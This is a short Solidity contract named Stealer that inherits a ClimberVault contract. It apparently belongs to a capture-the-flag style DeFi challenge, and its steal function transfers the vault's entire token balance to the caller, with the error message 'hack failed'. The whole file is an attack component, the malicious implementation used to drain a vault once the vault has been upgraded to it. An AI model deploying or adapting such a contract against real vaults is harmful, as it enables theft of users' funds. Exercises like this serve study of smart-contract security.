// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";

contract Stealer is ClimberVault {
    function steal(address target) external {
        IERC20 token = IERC20(target);
        bool success = token.transfer(
            msg.sender,
            token.balanceOf(address(this))
        );
        require(success, "hack failed");
    }
}
